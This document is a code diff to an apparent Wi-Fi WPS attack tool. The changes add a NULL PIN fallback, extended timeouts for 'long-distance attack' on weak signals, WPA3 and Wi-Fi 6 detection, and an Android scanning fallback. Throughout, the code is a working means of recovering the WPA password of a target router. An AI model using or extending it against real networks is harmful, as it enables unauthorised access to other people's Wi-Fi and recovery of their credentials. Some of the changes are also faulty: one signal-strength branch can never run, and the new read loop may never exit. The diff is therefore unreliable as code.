@@ -391,7 +391,8 @@ class WPSpin:
         if res:
             return res[0]
         else:
-            return None
+            print(f'{warn} No specific PIN found for {mac}, trying NULL PIN fallback (00000000)...')
+            return '00000000'
 
     def _suggest(self, mac):
         """
@@ -824,9 +825,18 @@ class Companion:
             return None
         return pin
 
-    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
+    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None, rssi=None):
         if not verbose:
             verbose = self.print_debug
+        
+        timeout_multiplier = 1.0
+        if rssi and rssi < -75:
+            timeout_multiplier = 2.0
+            print(f'{warn} Weak signal detected (RSSI: {rssi} dBm), using 2x extended timeout for long-distance attack...')
+        elif rssi and rssi < -85:
+            timeout_multiplier = 3.0
+            print(f'{warn} Very weak signal (RSSI: {rssi} dBm), using 3x extended timeout...')
+        
         self.pixie_creds.clear()
         self.connection_status.clear()
         self.wpas.stdout.read(300)   # Clean the pipe
@@ -846,10 +856,20 @@ class Companion:
             print(self._explain_wpas_not_ok_status(cmd, r))
             return False
 
+        import select
+        base_timeout = 0.1
+        timeout = base_timeout * timeout_multiplier
+        
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
-            if not res:
-                break
+            ready = select.select([self.wpas.stdout], [], [], timeout)
+            if ready[0]:
+                res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
+                if not res:
+                    break
+            else:
+                if timeout_multiplier > 1.0:
+                    continue
+                    
             if self.connection_status.status == 'WSC_NACK':
                 break
             elif self.connection_status.status == 'GOT_PSK':
@@ -861,7 +881,7 @@ class Companion:
         return False
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+                          pixieforce=False, store_pin_on_fail=False, rssi=None):
         if not pin:
             if pixiemode:
                 try:
@@ -879,18 +899,18 @@ class Companion:
                 # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
         if pbc_mode:
-            self.__wps_connection(bssid, pbc_mode=pbc_mode)
+            self.__wps_connection(bssid, pbc_mode=pbc_mode, rssi=rssi)
             bssid = self.connection_status.bssid
             pin = '<PBC mode>'
         elif store_pin_on_fail:
             try:
-                self.__wps_connection(bssid, pin, pixiemode)
+                self.__wps_connection(bssid, pin, pixiemode, rssi=rssi)
             except KeyboardInterrupt:
                 print("\nAborting…")
                 self.__savePin(bssid, pin)
                 return False
         else:
-            self.__wps_connection(bssid, pin, pixiemode)
+            self.__wps_connection(bssid, pin, pixiemode, rssi=rssi)
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
@@ -1041,8 +1061,21 @@ class WiFiScanner:
         except FileNotFoundError:
             self.stored = []
 
+    def universal_wifi_scan(self):
+        """Universal WiFi scan for Android/Linux - fetch WiFi like mobile systems"""
+        if isAndroid():
+            print(f'{info} Using Android universal WiFi fetch...')
+            cmd = 'cmd wifi list-scan-results 2>/dev/null || dumpsys wifi | grep -A 20 "Latest scan results"'
+            try:
+                proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE, encoding='utf-8', errors='replace')
+                return proc.stdout
+            except Exception as e:
+                print(f'{warn} Android WiFi fetch failed: {e}')
+        return None
+
     def iw_scanner(self) -> Dict[int, dict]:
-        """Parsing iw scan results"""
+        """Parsing iw scan results with WiFi 6 (802.11ax) and WPA3/SAE detection"""
         def handle_network(line, result, networks):
             networks.append(
                     {
@@ -1051,7 +1084,9 @@ class WiFiScanner:
                         'WPS locked': False,
                         'Model': '',
                         'Model number': '',
-                        'Device name': ''
+                        'Device name': '',
+                        'WiFi Standard': 'WiFi 4/5',
+                        'WPA3': False
                      }
                 )
             networks[-1]['BSSID'] = result.group(1).upper()
@@ -1083,6 +1118,21 @@ class WiFiScanner:
                     sec = 'WPA/WPA2'
             networks[-1]['Security type'] = sec
 
+        def handle_wpa3_sae(line, result, networks):
+            networks[-1]['WPA3'] = True
+            sec = networks[-1]['Security type']
+            if 'WPA3' not in sec:
+                if sec == 'Unknown':
+                    networks[-1]['Security type'] = 'WPA3'
+                else:
+                    networks[-1]['Security type'] = f'{sec}/WPA3'
+
+        def handle_wifi6(line, result, networks):
+            if 'HE' in line or '802.11ax' in line or 'WiFi 6' in line:
+                networks[-1]['WiFi Standard'] = 'WiFi 6 (802.11ax)'
+            elif '802.11ac' in line or 'VHT' in line:
+                networks[-1]['WiFi Standard'] = 'WiFi 5 (802.11ac)'
+
         def handle_wps(line, result, networks):
             networks[-1]['WPS'] = result.group(1)
 
@@ -1107,6 +1157,12 @@ class WiFiScanner:
         proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         lines = proc.stdout.splitlines()
+        
+        if not lines or 'command failed' in proc.stdout.lower():
+            universal_scan = self.universal_wifi_scan()
+            if universal_scan:
+                print(f'{ok} Using Android universal WiFi scan fallback')
+                lines = universal_scan.splitlines()
         networks = []
         matchers = {
             re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
@@ -1115,6 +1171,9 @@ class WiFiScanner:
             re.compile(r'(capability): (.+)'): handle_securityType,
             re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
             re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'.*SAE.*'): handle_wpa3_sae,
+            re.compile(r'.*AKM.*00-0f-ac:8.*'): handle_wpa3_sae,
+            re.compile(r'.*(HE |VHT |802\.11ax|802\.11ac).*'): handle_wifi6,
             re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
             re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
             re.compile(r' [*] Model: (.*)'): handle_model,
@@ -1205,7 +1264,7 @@ class WiFiScanner:
 
         return network_list
 
-    def prompt_network(self) -> str:
+    def prompt_network(self):
         os.system('clear')
         # This is the corrected banner
         banner = f"""
@@ -1222,14 +1281,14 @@ class WiFiScanner:
         networks = self.iw_scanner()
         if not networks:
             print(f'{err} No WPS networks found.')
-            return
+            return None, None
         while 1:
             try:
                 networkNo = input(f'{ask} Select target (press Enter to refresh): ')
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
+                    return networks[int(networkNo)]['BSSID'], networks[int(networkNo)].get('Level')
                 else:
                     raise IndexError
             except Exception:
@@ -1421,7 +1480,7 @@ if __name__ == '__main__':
                     scanner = WiFiScanner(args.interface, vuln_list)
                     if not args.loop:
                         print(f'{info} BSSID not specified (--bssid) — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
+                    args.bssid, rssi = scanner.prompt_network()
 
                 if args.bssid:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
@@ -1429,7 +1488,7 @@ if __name__ == '__main__':
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                     else:
                         companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                    args.show_pixie_cmd, args.pixie_force)
+                                                    args.show_pixie_cmd, args.pixie_force, rssi=rssi)
             if not args.loop:
                 break
             else:
